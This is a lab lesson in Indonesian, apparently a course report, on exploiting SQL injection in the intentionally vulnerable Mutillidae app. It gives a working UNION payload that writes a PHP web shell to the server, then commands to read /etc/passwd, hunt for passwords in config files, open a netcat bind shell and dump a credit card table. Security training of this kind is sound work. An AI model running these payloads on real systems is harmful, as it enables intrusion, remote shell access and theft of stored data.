# Lesson 10 : SQL Injection Union Exploit #3 (Create PHP Execution Script)

## Start Web Browser Session to Mutillidae
- Buka browser kemudian akses Mutillidae sesuai ip metasploit pada alamat http://10.0.1.100/mutillidae
![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/lesson_6/1/start_browser.png "Home page")

## Go To User Info Page
1. Go to User Info
   - **OWASP Top 10 --> A1 - SQL Injection --> SQLi - Extract Data --> User Info** 
![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/lesson_7/user_info.png "Home page")

## Inject Backdoor into User Info Page
1. Inspect the Name Textbox
   - Klik kanan pada textbox **Name**, kemudian inspect element
![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/lesson_8/inspect.png "Home page")
2. Change Text Box Size
   - Pada bagian size, tambahkan kapasistasnya dari yg semula 20 menjadi 100
![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/lesson_8/change_size.png "Home page")
3. Second Union SQL Injection Attempt
   - Pada kolom textbox **Name** isikan 
   ```bash
	' union select null,null,null,null,'<form action="" method="post" enctype="application/x-www-form-urlencoded"><input type="text" name="CMD" size="50"><input type="submit" value="Execute Command" /></form><?php echo "<pre>";echo shell_exec($_REQUEST["CMD"]);echo "</pre>"; ?>' INTO DUMPFILE '/var/www/html/mutillidae/execute_command.php' -- 
   ```
   - Pastikan anda menambahkan spasi setelah karakter **`--`**
   - Klik tombol **View Account Details**
![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/lesson_10/union.png "Home page")
4. Viewing the Results
	- Scroll kebawah untuk melihat hasilnya
	- Perhatikan hasilnya
![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/lesson_9/result_union_2.png "Home page")

## Using the Backdoor for Basic Reconnaissance
1. Initial Reconnaissance
	- Buka url berikut pada browser 
	http://10.0.1.100/mutillidae/execute_command.php
	- Ketikkan perintah berikut pada textbox:
	```bash
   whoami; pwd
   ```
	- Klik tombol Execute Command
![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/lesson_10/whoami.png "Home page")
2. Who is Logged On
   - Ketikkan perintah berikut pada textbox:
	```bash
   w
   ```
   - Klik tombol Execute Command
![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/lesson_10/w.png "Home page")
3. Exploring /etc/passwd
   - Ketikkan perintah berikut pada textbox:
	```bash
   cat /etc/passwd
   ```
   - Klik tombol Execute Command
![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/lesson_10/cat_passwd.png "Home page")
4. Network Reconnaissance
   - Ketikkan perintah berikut pada textbox:
   ```bash
   netstat -nao | grep "0.0.0.0:"
   ```
   - Klik tombol Execute Command
![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/lesson_10/netstat.png "Home page")

## Using the Backdoor for Database Reconnaissance
1. Database Reconnaissance
   - Ketikkan perintah berikut pada textbox:
   ```bash
   find * -name "*.php" | xargs grep -i "password" | grep "="
   ```
   - Klik tombol Execute Command
![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/lesson_10/find.png "Home page")
2. View Database Authentication Attributes
   - Ketikkan perintah berikut pada textbox:
   ```bash
   cat config.inc | grep -v "<?php"
   ```
   - Klik tombol Execute Command
![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/lesson_10/cat_config.png "Home page")

##  Using the Backdoor for Netcat Reconnaissance
1. Netcat Reconnaissance
   - Ketikkan perintah berikut pada textbox:
   ```bash
   which nc; netstat -nao | grep 4444 | wc -l
   ```
   - Klik tombol Execute Command
![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/lesson_10/which_nc.png "Home page")
2. Execute Netcat
   - Ketikkan perintah berikut pada textbox
   ```bash
   mkfifo /tmp/pipe;sh /tmp/pipe | nc -lp 4444 -e /bin/bash> /tmp/pipe
   ```
   - Klik tombol Execute Command
![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/lesson_10/mkfifo.png "Home page")
3. Open another terminal window
	- Buka terminal lain pada kali linux
4. Connect to Netcat
   - Buka koneksi ke mutillidae menggunakan netcat
   - Ketikkan perintah : **`nc 10.0.1.100 4444`**
   - Ketikkan perintah : **`hostname`** untuk melihat hostname
   - Ketikkan perintah : **`whoami`** untuk melihat user yang digunakan
![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/lesson_10/terminal_nc.png "Home page")
5. View Credit Card Information
   - Pada terminal ketikkan printah-perintah berikut :
   ```bash
   echo "show databases;" | mysql -uroot -psamurai
   echo "use nowasp; show tables;" | mysql -uroot -psamurai
   echo "select * from nowasp.credit_cards;" | mysql -uroot -psamurai
   ```
![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/lesson_10/terminal_data.png "Home page")

## Note
- Agar file **execute_command.php** dapat dibuat pada metasploit, pastikan anda sudah menonaktifkan apparmor
- Konfigurasi untuk menonaktifkan AppArmor ada [disini](https://github.com/luqmanahmads/laporan-pksj/blob/master/Laporan_Tugas_Final/konfigurasi_apparmor.md)